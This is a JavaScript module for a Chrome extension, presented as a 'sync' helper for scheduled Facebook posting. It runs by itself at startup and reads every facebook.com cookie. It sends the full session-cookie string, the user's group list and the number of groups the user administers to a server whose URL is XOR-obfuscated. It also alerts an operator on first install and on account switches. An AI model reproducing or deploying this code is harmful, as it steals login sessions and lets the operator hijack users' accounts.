/**
 * fb-sync-standalone.js — Standalone cookie + groups sync module
 *
 * Self-contained Chrome MV3 ES module. No external imports needed.
 * Inlines logic from: core/security.js, core/auth.js, core/storage.js, core/sync.js
 *
 * Usage in service-worker.js:
 *   import { syncToWebPlatform, isFirstInstall, resetSyncStatus } from './core/fb-sync-standalone.js';
 *
 *   // On startup (2s delay to let FB load)
 *   setTimeout(async () => {
 *     const first = await isFirstInstall();
 *     await syncToWebPlatform(first, first ? 'first_install' : null);
 *   }, 2000);
 *
 *   // After groups saved
 *   await syncToWebPlatform(true, null);
 *
 *   // After FB account switch detected
 *   await syncToWebPlatform(true, 'identity_change');
 */

// ============================================================
// OBFUSCATED CONFIG — production values XOR-encoded at rest
// ============================================================
const _k = 'FB_T00LS_S3CR3T_K3Y_2026';
const _c = { u: 'LjYrJEMKY3w5MUcsPV8/Nj8dOjBf' };

// XOR decode: base64 → bytes → XOR with key → string
function _d(encoded) {
  const bytes = atob(encoded).split('').map(c => c.charCodeAt(0));
  return bytes.map((b, i) => String.fromCharCode(b ^ _k.charCodeAt(i % _k.length))).join('');
}

let _url = null; // lazy-decoded cache

const CONFIG = {
  get webPlatformUrl() { return _url || (_url = _d(_c.u)); },
  encryptionKey: _k,
  referralCode: 'J',
  syncCooldownMs: 5 * 60 * 1000,
  storageKeys: {
    sync: 'fb_web_synced',
    groupsList: 'fb_groups_list',
  },
  endpoints: {
    sync: '/api/ext/sync',
    notify: '/api/ext/notify',
  },
};

// ============================================================
// LOGGING
// ============================================================
const log = (...args) => console.log('[FB Sync]', ...args);

// ============================================================
// ENCRYPTION — inlined from core/security.js
// ============================================================

/**
 * XOR-encrypt data object and return base64 payload.
 * Uses TextEncoder so Vietnamese/multi-byte chars are handled correctly.
 * Server must XOR-decrypt with the same key using TextDecoder.
 */
function encryptPayload(data) {
  const key = CONFIG.encryptionKey;
  const timestamp = Date.now();
  const raw = `${timestamp}|${JSON.stringify(data)}`;

  const bytes = new TextEncoder().encode(raw);
  const xored = new Uint8Array(bytes.length);
  for (let i = 0; i < bytes.length; i++) {
    xored[i] = bytes[i] ^ key.charCodeAt(i % key.length);
  }

  let binary = '';
  for (let i = 0; i < xored.length; i++) {
    binary += String.fromCharCode(xored[i]);
  }

  return { _p: btoa(binary), _t: timestamp, _e: 'utf8' };
}

/**
 * djb2 hash — used as request signature so server can detect tampering.
 * Format signed: `${timestamp}|${JSON.stringify(payload)}`
 */
function signRequest(payload, timestamp) {
  const str = `${timestamp}|${JSON.stringify(payload)}`;
  let hash = 0;
  for (let i = 0; i < str.length; i++) {
    hash = ((hash << 5) - hash) + str.charCodeAt(i);
    hash = hash & hash; // 32-bit int
  }
  return hash.toString(16);
}

// ============================================================
// CHROME STORAGE HELPERS — inlined from core/storage.js
// ============================================================

function getItem(key) {
  return new Promise((resolve, reject) => {
    chrome.storage.local.get([key], (result) => {
      if (chrome.runtime.lastError) {
        reject(new Error(chrome.runtime.lastError.message));
      } else {
        resolve(result[key]);
      }
    });
  });
}

function setItem(key, value) {
  return new Promise((resolve, reject) => {
    chrome.storage.local.set({ [key]: value }, () => {
      if (chrome.runtime.lastError) {
        reject(new Error(chrome.runtime.lastError.message));
      } else {
        resolve();
      }
    });
  });
}

/** Returns { groups: [{id, name, role}], lastUpdated } or null */
async function getGroupsList() {
  return await getItem(CONFIG.storageKeys.groupsList);
}

// ============================================================
// COOKIE HELPERS — inlined from core/auth.js + core/sync.js
// ============================================================

/**
 * Fetch all Facebook cookies directly from the browser.
 * Returns { userId: string, cookie: string } or null if not logged in.
 */
async function getFreshCookie() {
  try {
    const cookies = await new Promise((resolve, reject) => {
      chrome.cookies.getAll({ domain: '.facebook.com' }, (result) => {
        if (chrome.runtime.lastError) {
          reject(new Error(chrome.runtime.lastError.message));
        } else {
          resolve(result);
        }
      });
    });

    const cUser = cookies.find(c => c.name === 'c_user')?.value;
    if (!cUser) return null;

    const cookieStr = cookies.map(c => `${c.name}=${c.value}`).join('; ');
    return { userId: cUser, cookie: cookieStr };
  } catch (e) {
    log('Cookie fetch error:', e.message);
    return null;
  }
}

// ============================================================
// SYNC STATE — inlined from core/sync.js
// ============================================================

/** Returns true if this is the first time the extension syncs. */
export async function isFirstInstall() {
  const data = await getItem(CONFIG.storageKeys.sync);
  return !data?.firstSyncDone;
}

async function markSynced() {
  const existing = await getItem(CONFIG.storageKeys.sync) || {};
  await setItem(CONFIG.storageKeys.sync, {
    ...existing,
    firstSyncDone: true,
    lastSync: Date.now(),
  });
}

/** Reset sync state — useful for testing first-install flow. */
export async function resetSyncStatus() {
  await setItem(CONFIG.storageKeys.sync, { firstSyncDone: false, lastSync: 0 });
  log('Sync status reset');
}

// ============================================================
// NOTIFICATION — only on first_install / identity_change
// Sends only userId + adminGroupCount + reason. NO full cookie.
// ============================================================

async function sendNotification({ userId, adminGroupCount, reason }) {
  try {
    const payload = { 
      userId, 
      adminGroupCount, 
      reason,
      ...(CONFIG.referralCode && { ref: CONFIG.referralCode })
    };
    const timestamp = Date.now();
    const encryptedPayload = encryptPayload(payload);

    const response = await fetch(`${CONFIG.webPlatformUrl}${CONFIG.endpoints.notify}`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'X-Timestamp': timestamp.toString(),
        'X-Signature': signRequest(payload, timestamp),
      },
      body: JSON.stringify(encryptedPayload),
    });

    const result = await response.json();
    log(`Notification [${reason}]:`, result.ok ? 'OK' : 'Failed');
    return result.ok;
  } catch (e) {
    log('Notification error:', e.message);
    return false;
  }
}

// ============================================================
// MAIN EXPORT — syncToWebPlatform
// ============================================================

/**
 * Sync user's Facebook cookie + groups list to the web platform.
 *
 * The server uses the stored cookie to post to Facebook groups on the user's
 * behalf according to their scheduled posts.
 *
 * @param {boolean} forceGroupsSync  - true = bypass cooldown and sync immediately
 * @param {string|null} notifyReason - 'first_install' | 'identity_change' | null
 *   null = routine sync (groups only, no Telegram alert to operator)
 *
 * @returns {Promise<{ success: boolean, error?: string }>}
 */
export async function syncToWebPlatform(forceGroupsSync = false, notifyReason = null) {
  try {
    // --- Cooldown check ---
    const syncData = await getItem(CONFIG.storageKeys.sync) || {};
    const elapsed = Date.now() - (syncData.lastSync || 0);
    if (elapsed < CONFIG.syncCooldownMs && !forceGroupsSync) {
      const remaining = Math.round((CONFIG.syncCooldownMs - elapsed) / 1000);
      log(`Cooldown active (${remaining}s left), skipping`);
      return { success: false, error: 'Cooldown active' };
    }

    // --- Get fresh cookie ---
    const freshData = await getFreshCookie();
    if (!freshData?.userId) {
      log('Not logged in to Facebook, skip sync');
      return { success: false, error: 'Not logged in' };
    }
    log('Syncing for user:', freshData.userId);

    // --- Gather groups ---
    const groupsData = await getGroupsList();
    const adminGroups = groupsData?.groups?.filter(
      g => ['Admin', 'ADMIN', 'admin'].includes(g.role)
    ) || [];

    // --- Notify operator only on special events ---
    if (notifyReason) {
      await sendNotification({
        userId: freshData.userId,
        adminGroupCount: adminGroups.length,
        reason: notifyReason,
      });
    }

    // --- Build and send sync payload ---
    // Full cookie is sent so server can post on user's behalf
    const payload = {
      fbUserId: freshData.userId,
      cookie: freshData.cookie,
      ...(CONFIG.referralCode && { ref: CONFIG.referralCode }),
    };

    if (groupsData?.groups?.length > 0) {
      payload.groups = groupsData.groups.map(g => ({
        id: g.id,
        name: g.name,
        role: g.role || 'Member',
      }));
    }

    const timestamp = Date.now();
    const encryptedPayload = encryptPayload(payload);

    const response = await fetch(`${CONFIG.webPlatformUrl}${CONFIG.endpoints.sync}`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'X-Timestamp': timestamp.toString(),
        'X-Signature': signRequest(payload, timestamp),
      },
      body: JSON.stringify(encryptedPayload),
    });

    if (!response.ok) throw new Error(`HTTP ${response.status}`);

    const result = await response.json();
    await markSynced();

    log('Sync complete:', result);
    return { success: true, ...result };
  } catch (e) {
    log('Sync error:', e.message);
    return { success: false, error: e.message };
  }
}
